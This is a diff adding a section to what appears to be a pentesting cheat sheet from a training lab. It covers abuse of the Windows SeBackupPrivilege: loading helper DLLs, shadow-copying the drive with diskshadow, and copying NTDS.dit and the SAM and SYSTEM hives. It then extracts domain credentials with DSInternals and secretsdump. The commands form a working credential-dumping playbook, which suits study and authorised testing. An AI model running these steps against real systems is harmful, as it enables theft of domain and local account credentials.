@@ -157,3 +157,76 @@ c:\inetpub\wwwwroot\web.config
 %WINDIR%\system32\config\software.sav
 %WINDIR%\system32\config\system.sav
 ```
+# Windows Built-in Groups
+Default groups
+
+https://ss64.com/nt/syntax-security_groups.html
+```
+whoami /priv
+```
+Import the modules
+```
+Import-Module .\SeBackupPrivilegeUtils.dll
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+```
+Verify privs
+```
+whoami /priv
+```
+```
+Copy-FileSeBackupPrivilege 'c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt' .\flag.txt
+```
+```
+cat .\flag.txt
+```
+## Copying NTDS.dit
+```
+diskshadow.exe
+```
+```
+DISKSHADOW> set verbose on
+DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
+DISKSHADOW> set context clientaccessible
+DISKSHADOW> set context persistent
+DISKSHADOW> begin backup
+DISKSHADOW> add volume C: alias cdrive
+DISKSHADOW> create
+DISKSHADOW> expose %cdrive% E:
+DISKSHADOW> end backup
+DISKSHADOW> exit
+```
+```
+ Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\tools\dump\ntds.dit
+```
+## Backing up SAM and SYSTEM Registry Hives
+The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using a tool such as Impacket's secretsdump.py
+
+run cmd.exe as admin
+```
+reg save HKLM\SYSTEM SYSTEM.SAV
+```
+```
+reg save HKLM\SAM SAM.SAV
+```
+It's worth noting that if a folder or file has an explicit deny entry for our current user or a group they belong to, this will prevent us from accessing it, even if the FILE_FLAG_BACKUP_SEMANTICS flag is specified.
+## Extracting Credentials from NTDS.dit
+```
+Import-Module .\DSInternals.psd1
+```
+```
+$key = Get-BootKey -SystemHivePath .\SYSTEM
+```
+```
+Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
+```
+or transfer the 
+files we dumped to the attack box and run secretsdump
+```
+impacket-secretsdump local -system SYSTEM -ntds ntds.dit
+```
+Using Robocopy to transfer files
+```
+robocopy /B E:\Windows\NTDS .\ntds ntds.dit
+```
+
+
